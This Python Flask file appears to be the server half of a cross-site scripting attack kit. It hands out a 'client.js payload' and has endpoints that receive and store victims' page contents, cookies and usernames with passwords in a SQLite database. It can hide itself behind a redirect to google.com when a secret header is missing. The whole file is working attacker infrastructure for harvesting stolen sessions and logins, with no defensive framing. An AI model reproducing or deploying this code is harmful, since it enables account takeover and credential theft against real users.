from flask import Flask, request, send_file, g, redirect
from flask_cors import CORS
import sqlite3

# Configs
#################################
use_password_header=False
hidden_redirect="https://google.com"
service_password='password123'
#################################

app = Flask(__name__)
CORS(app)
database=r'sqlite.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(database)
    return db

def insert_content_entry(content):
    c = get_db()
    query = 'INSERT INTO content(location, content) VALUES(?,?)'
    try: 
        c.execute(query, content)
        c.commit()
    except Exception as e:
        print (e)

def insert_cookie_entry(cookie):
    c = get_db()
    query = 'INSERT INTO cookies(cookie, value) VALUES(?,?)'
    try: 
        c.execute(query, cookie)
        c.commit()
    except Exception as e:
        print (e)

def insert_credential_entry (creds):
    c = get_db()
    query = 'INSERT INTO credentials(username, password) VALUES(?,?)'
    try: 
        c.execute(query, creds)
        c.commit()
    except Exception as e:
        print (e)


# Serve file client.js
@app.route('/client.js', methods=['GET'])
def clientjs():
    print ('[+] Sending client.js payload')
    return send_file('./client.js', download_name='client.js')

# Receive a POST with a page content
@app.route('/content', methods=['POST'])
def content():
    if (use_password_header and request.headers.get('X-Pass') != service_password):
        return redirect(hidden_redirect)
    print ('[+] Received a new post')
    if request.headers.get('Content-Type') == 'application/json':
        data = request.json
        url = data.get('url')
        content = data.get('content')
    else:
        url = request.form['url']
        content = request.form['content']
            
    insert_content_entry((url, content))
    
    return "ok"

# Receive a POST with a cookie list
@app.route('/cookies', methods=['POST'])
def cookieHandler():
    if (use_password_header and request.headers.get('X-Pass') != service_password):
        return redirect(hidden_redirect)
    print ('[+] Received a new post')
    if request.headers.get('Content-Type') == 'application/json':
        data = request.json
        cookies = data.get('cookie')
    else:
        cookies  = request.form['cookie']
            
    for cookie in cookies.split(';'):
        parsedCookie = cookie.split('=')
        insert_cookie_entry((parsedCookie[0], parsedCookie[1]))
    
    return "ok"

# Receive a POST with creds
@app.route('/creds', methods=['POST'])
def creds():
    if (use_password_header and request.headers.get('X-Pass') != service_password):
        return redirect(hidden_redirect)
    print ('[+] Received a new post')
    if request.headers.get('Content-Type') == 'application/json':
        data = request.json
        username = data.get('username')
        password = data.get('password')
    else:
        username = request.form['username']
        password = request.form['password']
            
    insert_credential_entry((username, password))
    
    return "ok"

# DB Taerdown
@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
